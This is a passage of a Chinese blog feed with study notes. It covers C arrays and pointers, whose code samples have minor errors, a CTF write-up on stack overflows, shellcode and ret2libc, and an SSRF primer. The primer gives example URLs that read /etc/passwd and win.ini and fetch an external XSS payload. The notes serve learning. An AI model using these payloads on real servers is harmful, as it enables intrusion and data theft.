<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第三种：只给一部分赋值，其余自动初始化为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 表示为前边 6 个元素赋值，后边 4 个元素系统自动初始化为 0</span></code></pre>
</li>
<li><p>第四种：可以只给出各个元素的值，而不指定数组的长度</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第五种：C99 增加了一种新特性——指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 编译的时候记得加上–std=c99选项</span></code></pre>
</li>
</ul>
<hr>
<hr>
<h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a><strong>字符串处理函数</strong></h2><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><ul>
<li>两种方式存放和表达字符串：1.字符串常量2.字符类型的数组</li>
<li>字符数组</li>
</ul>
<blockquote>
<p>可以先定义指定长度的字符数组，然后再给每个元素单独赋值：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

    ……
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>还可以直接在定义的时候对字符数组进行初始化，这样会方便很多：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 初始化字符数组的每个元素</span>
    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 可以不写元素的个数，因为编译器会自动计算</span>
    <span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化字符数组</span>
    <span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Nines"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化，可以省略大括号</span>
    <span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Nines"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<h3 id="字符串处理函数-1"><a href="#字符串处理函数-1" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul>
<li>获取字符串的长度：strlen 函数</li>
</ul>
<p>拷贝字符串：strcpy 函数和 strncpy 函数</p>
<p>连接字符串：strcat 函数和 strncat 函数</p>
<p>比较字符串：strcmp 函数和 strncmp 函数</p>
<hr>
<hr>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a><strong>二维数组</strong></h2><h3 id="1-二维数组的定义"><a href="#1-二维数组的定义" class="headerlink" title="1.二维数组的定义"></a>1.二维数组的定义</h3><ul>
<li>定义二维数组的方法跟一维数组相似，使用方括号指定每个维度的元素个数：</li>
</ul>
<blockquote>
<p>类型 数组名[常量表达式][常量表达式]</p>
</blockquote>
<blockquote>
<p><font color="red">注意</font>：这里需要强调的是几行几列我们是从概念模型上来看的，也就是说，这样来看待二维数组，我们可以更容易理解。但从物理模型上看，无论是二维数组还是更多维的数组，在内存中仍然是以线性的方式存储的。</p>
</blockquote>
<h3 id="2-二维数组的访问"><a href="#2-二维数组的访问" class="headerlink" title="2.二维数组的访问"></a>2.二维数组的访问</h3><ul>
<li>数组名[下标]:<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问a数组中第1行第1列的元素</span>
b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问b数组中第2行第4列的元素</span></code></pre>
</li>
<li><font color="red">要防止数组越界</font></li>
</ul>
<h3 id="3-二维数组的初始化"><a href="#3-二维数组的初始化" class="headerlink" title="3.二维数组的初始化"></a>3.二维数组的初始化</h3><ul>
<li><p>由于二维数组在内存中是线性存放的，因此可以将数据写在一个花括号内</p>
</li>
<li><p>为了更直观地表示元素的分布，可以用大括号将每一行的元素括起来</p>
</li>
<li><p>二维数组也可以仅对部分元素赋初值</p>
</li>
<li><p>C99 同样增加了一种新特性：指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>二维数组也可以让编译器根据元素的数量计算数组的长度。但只有第 1 维的元素个数可以不写，其他维度必须写上</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a><strong>指针</strong></h2><h3 id="1-内存存放变量"><a href="#1-内存存放变量" class="headerlink" title="1.内存存放变量"></a>1.内存存放变量</h3><ul>
<li>通过变量名对变量进行访问和存储是为了方便程序员而设计的，其实在内存中完全没有存储变量名的必要。因为编译器知道具体每一个变量名对应的存放地址，所以当你读取某个变量的时候，编译器就会找到变量名所在的地址，并根据变量的类型读取相应范围的数据。</li>
</ul>
<h3 id="2-指针和指针变量"><a href="#2-指针和指针变量" class="headerlink" title="2.指针和指针变量"></a>2.指针和指针变量</h3><ul>
<li>通常我们所说的指针，就是地址的意思。C 语言中有专门的指针变量用于存放指针，跟普通变量不同，指针变量存储的是一个地址。</li>
<li>指针变量也有类型，它的类型就是存放的地址指向的数据类型。</li>
</ul>
<h3 id="3-定义指针变量"><a href="#3-定义指针变量" class="headerlink" title="3.定义指针变量"></a>3.定义指针变量</h3><ul>
<li>定义指针变量跟普通变量十分相似，只是中间多了一个星号（*）<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></code></pre>
</li>
<li>左侧的数据类型表示指针变量中存放的地址指向的内存单元的数据类型</li>
</ul>
<h3 id="4-取地址运算符和取值运算符"><a href="#4-取地址运算符和取值运算符" class="headerlink" title="4.取地址运算符和取值运算符"></a>4.取地址运算符和取值运算符</h3><ul>
<li><p>如果需要获取某个变量的地址，可以使用取地址运算符（&amp;）</p>
</li>
<li><p>如果需要访问指针变量指向的数据，可以使用取值运算符（*）</p>
</li>
<li><p><font color="red">注意</font>：取值运算符跟定义指针用的都是星号（*），这属于符号的重用，在不同的地方有不同的意义：在定义时表示定义一个指针变量；在其他位置表示获取指针变量指向的变量的值</p>
</li>
<li><p><font color="red"><strong>避免访问未初始化指针</strong></font> </p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a><strong>指针和数组</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><ul>
<li>数组不是指针</li>
<li>数组名是数组第一个元素的地址，也是数组的首地址<h3 id="2-指向数组的指针："><a href="#2-指向数组的指针：" class="headerlink" title="2.指向数组的指针："></a>2.指向数组的指针：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
p <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句1</span>
p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句2</span></code></pre>
<blockquote>
<p>因为数组名即数组第一个元素的地址，所以语句 1 和语句 2 是等价的，都是将数组 a 的首地址存放到指针变量 p 中。</p>
</blockquote>
</li>
</ul>
<h3 id="3-指针的运算"><a href="#3-指针的运算" class="headerlink" title="3.  指针的运算"></a>3.  指针的运算</h3><ul>
<li><p>当指针指向数组元素的时候，我们可以对指针变量进行加减运算，这样做的意义相当于指向距离指针所在位置向前或向后第 n 个元素。比如 p+1 表示指向 p 指针指向的元素的下一个元素；p-1 则表示指向上一个元素。</p>
</li>
<li><p><font color="red">注意</font>：p+1 并不是简单地将地址加1，而是指向数组的下一个元素</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a><strong>指针数组和数组指针</strong></h2><h3 id="1-指针和数组的区别"><a href="#1-指针和数组的区别" class="headerlink" title="1. 指针和数组的区别"></a>1. 指针和数组的区别</h3><ul>
<li>指针是左值</li>
<li>而数组名只是一个地址常量，它不可以被修改，所以数组名不是左值。</li>
</ul>
<h3 id="2-指针数组"><a href="#2-指针数组" class="headerlink" title="2. 指针数组"></a>2. 指针数组</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>p1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">指针数组是一个数组，每个数组元素存放一个指针变量。</font></li>
</ul>
<h3 id="3-数组指针"><a href="#3-数组指针" class="headerlink" title="3.数组指针"></a>3.数组指针</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>p2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">数组指针是一个指针，它指向的是一个数组。</font></li>
</ul>
<hr>
<hr>
<h2 id="指针和二维数组"><a href="#指针和二维数组" class="headerlink" title="指针和二维数组"></a><strong>指针和二维数组</strong></h2><ul>
<li><p>在 C 语言中，二维数组的实现，只是简单地通过“线性扩展”的方式进行。</p>
</li>
<li><p>要用指针来指向二维数组，需要使用数组指针的形式。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="void指针和NULL指针"><a href="#void指针和NULL指针" class="headerlink" title="void指针和NULL指针"></a><strong>void指针和NULL指针</strong></h2><h3 id="1-void类型"><a href="#1-void类型" class="headerlink" title="1.void类型"></a>1.void类型</h3><ul>
<li>void 即的字面意思是“无类型”，定义变量的时候，我们通过类型来决定该变量所占的内存空间。</li>
</ul>
<h3 id="2-void指针"><a href="#2-void指针" class="headerlink" title="2.void指针"></a>2.void指针</h3><ul>
<li>void 指针我们把它称之为通用指针，就是可以指向任意类型的数据。也就是说，任何类型的指针都可以赋值给 void 指针。</li>
</ul>
<blockquote>
<p>不要直接对 void 指针进行解引用，因为编译器不知道它所指向的数据类型</p>
</blockquote>
<blockquote>
<p>使用 void 指针一定要小心，由于 void 指针可以包罗万象的特性，间接使得不同类型的指针转换变为合法</p>
</blockquote>
<h3 id="3-NULL指针"><a href="#3-NULL指针" class="headerlink" title="3.NULL指针"></a>3.NULL指针</h3><ul>
<li><p>如果一个指针不指向任何数据，我们就称之为空指针，用 NULL 表示。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> NULL ((void *)0)</span></code></pre>
</li>
<li><p>地址 0 通常是一个不被使用的地址。所以，如果一个指针指向 NULL，那么就意味着该指针不指向任何东西。</p>
</li>
<li><p><font color="red">当你还不清楚要将指针初始化为什么地址时，请将它初始化 NULL；在对指针进行解引用时，先检查该指针是否为 NULL。这种策略可以为你今后编写大型程序节省大量的调试时间。</font></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>PWN笔记（一）</title>
    <url>/2019/10/26/PWN%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h2 id="一、缓存区溢出条件："><a href="#一、缓存区溢出条件：" class="headerlink" title="一、缓存区溢出条件："></a>一、缓存区溢出条件：</h2><ul>
<li>1.程序有向栈写入数据的行为</li>
<li>2.程序不限制写入数据的长度；</li>
</ul>
<a id="more"></a>

<h2 id="二、函数调用栈"><a href="#二、函数调用栈" class="headerlink" title="二、函数调用栈"></a>二、函数调用栈</h2><ul>
<li><p>1.调用函数在栈内，被调用函数在栈顶。<br>调用结束后被调用函数被弹出，栈顶恢复到调用函数的状态</p>
</li>
<li><p>2.<strong>esp</strong> –&gt; 用来存储函数调用栈的==栈顶地址==（在压栈退栈中变化）</p>
</li>
<li><p>  <strong>ebp</strong> –&gt; 用来存储当前函数状态的==基地址==，在函数运行时不变，可以用来索引确定函数参数和局部变量的位置</p>
<p>  <strong>eip</strong> –&gt; 用来存储即将执行的程序指令的地址（CPU依照eip的存储内容读取指令并执行）</p>
</li>
<li><p>3</p>
</li>
</ul>
<p><strong>发生函数调用的核心任务</strong>是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态</p>
<ul>
<li><p>将被调用函数的参数逆序压入栈内，这些参数会保存在caller的状态里，之后压入的数据会作为callee处理 –&gt; 压入被调用函数的返回地址 –&gt; 压入caller的ebp，并更新ebp的值为栈顶的返回地址 –&gt;<br>将callee的局部变量压入栈内</p>
<blockquote>
<p>PS:调用参数以外的数据构成了callee的状态</p>
</blockquote>
<p><strong>函数调用结束的核心任务</strong>是丢弃被调用函数(callee)的状态，并将栈顶恢复为调用函数(caller)的状态</p>
</li>
<li><p>将局部变量弹出，栈顶指向callee的基地址 –&gt;<br>将基地址内存储的调用函数caller的基地址弹出并存到ebp寄存器内，caller的ebp信息恢复，栈顶指向callee的返回地址 –&gt;<br>将返回地址弹出，caller的eip信息恢复</p>
</li>
</ul>
<h2 id="三、栈攻击溢出"><a href="#三、栈攻击溢出" class="headerlink" title="三、栈攻击溢出"></a>三、栈攻击溢出</h2><ul>
<li>1.最关键：eip寄存器（载入攻击命令的地址）</li>
</ul>
<pre><code>&gt; 结束函数调用时
  核心目的：用攻击指令的地址来覆盖返回地址

&gt; 函数调用发生时
eip会指向原程序中的某个指定函数
手段：“偷梁换柱” ---  将原本指定的函数在调用时替换为其他函数</code></pre><hr>
<p>shellcode：修改返回地址，让其指向溢出数据的一段指令</p>
<p>return2libc：修改返回地址，让其指向内存中已有的某个函数</p>
<p>ROP：修改返回地址，让其指向内存中已有的一段指令</p>
<p>hijack GOT：修改某个被调用函数的地址，让其指向另一个函数</p>
<hr>
<h2 id="四、Shellcode"><a href="#四、Shellcode" class="headerlink" title="四、Shellcode"></a>四、Shellcode</h2><p>（–修改返回地址，让其指向溢出数据的一段指令–）</p>
<ul>
<li>溢出数据的构造<br>padding1 + address of shellcode + padding2 +shellcode</li>
</ul>
<ul>
<li>padding1处的数据可以随意填充（如果利用==字符串==程序输入溢出数据不要包含”\x00”，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<br>address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。<br>padding2处的数据也可以随意填充，长度任意。shellcode应该为十六进制的机器码格式</li>
</ul>
<hr>
<ul>
<li>返回地址之前的填充数据（padding1）应该多长？</li>
</ul>
<blockquote>
<p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p>
</blockquote>
<ul>
<li>shellcode起始地址应该是多少？</li>
</ul>
<blockquote>
<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
</blockquote>
<blockquote>
<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
</blockquote>
<blockquote>
<p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p>
</blockquote>
<h2 id="五、Return2libc"><a href="#五、Return2libc" class="headerlink" title="五、Return2libc"></a>五、Return2libc</h2><p>（–修改返回地址，让其指向内存中已有的某个函数–）</p>
<ul>
<li>1.要在内存中确定某个函数的地址，并用其覆盖掉返回地址。</li>
</ul>
<blockquote>
<p>主要关注libc动态链接库，该库包含了一些系统级的函数（如system()等），从而利用这些系统级函数来获得当前进程的控制权。<br>下面以system(“/bin/sh”)为例</p>
</blockquote>
<ul>
<li><p>2.payload:padding1 + address of system() + padding2 + address of “/bin/sh”</p>
</li>
<li><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
</li>
</ul>
<hr>
<ul>
<li>返回地址之前的填充数据（padding1）应该多长？</li>
</ul>
<blockquote>
<p>解决方法和 shellcode 中提到的答案一样。</p>
</blockquote>
<ul>
<li>system() 函数地址应该是多少？</li>
</ul>
<blockquote>
<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
</blockquote>
<ul>
<li>最后，“/bin/sh” 的地址在哪里？</li>
</ul>
<blockquote>
<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
</blockquote>
<hr>
<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞浅析</title>
    <url>/2019/10/26/SSRF%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到的数据限制。</li>
</ul>
<a id="more"></a>

<ul>
<li>一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，<font color="red">所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人</font>）</li>
<li>SSRF 形成的原因大都是由于<font color="green">服务端</font>提供了从其他服务器应用获取数据的功能，且没有对目标地址做<font color="green">过滤与限制</font>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li>
</ul>
<blockquote>
<p>比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做<font color="red">中间人</font>，访问b网站，从而达到攻击b网站需求。</p>
</blockquote>
<hr>
<p>通过修改http头让a.com去访问b.com：</p>
<pre><code>GET /?url=http://b.com/HTTP/1.1

HOST: a.com
</code></pre><hr>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol>
<li>内外网的端口和服务扫描</li>
<li>主机本地敏感数据的读取（通过 url scheme (file:///, dict://, ftp://, gopher:// …) 读取内部资源或者让服务执行相应的动作)</li>
<li>内外网主机应用程序漏洞的利用</li>
<li>内外网Web站点的漏洞利用</li>
<li>反射XSS</li>
</ol>
<p>……</p>
<blockquote>
<p>故此ssrf一般评级为<font color="red">中高危</font>漏洞</p>
</blockquote>
<hr>
<h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><ul>
<li>正常用户访问网站的流程是：</li>
</ul>
<p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p>
<p>【那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL】" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL】</a></p>
<ul>
<li>那么产生SSRF漏洞的环节在哪里呢？<font color="red">安全的网站应接收请求后，检测请求的合法性</font></li>
</ul>
<p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p>
<p>例如</p>
<pre><code>www.baidu.com/xxx.php?image=www.abc.com/1.jpg</code></pre><ul>
<li>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></li>
</ul>
<blockquote>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
</blockquote>
<p>简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后<font color="blue">服务器以他的身份来访问其他服务器的资源。</font></p>
<hr>
<h2 id="SSRF产生反射型XSS"><a href="#SSRF产生反射型XSS" class="headerlink" title="SSRF产生反射型XSS"></a><font color="green">SSRF产生反射型XSS</font></h2><p>简单的从外部网站获取一个恶意payload，并且响应类型是html格式，如：</p>
<pre><code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></pre><h2 id="利用协议进行信息探测"><a href="#利用协议进行信息探测" class="headerlink" title="利用协议进行信息探测"></a><font color="green">利用协议进行信息探测</font></h2><ul>
<li>当找到一个 SSRF 时，第一件事情就是测试对应可支持的 url scheme，如：</li>
</ul>
<ol>
<li>file://</li>
<li>dict://</li>
<li>sftp://</li>
<li>ldap://</li>
<li>tftp://</li>
<li>gopher://</li>
</ol>
<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>File模式用于从文件系统中获取内容</p>
<pre><code>http://example.com/ssrf.php?url=file:///etc/passwd

http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><h3 id="dic"><a href="#dic" class="headerlink" title="dic://"></a>dic://</h3><p>当服务端禁止或者只允许白名单从外部网站请求资源，你可以通过 dic:// 模式来发送一个请求</p>
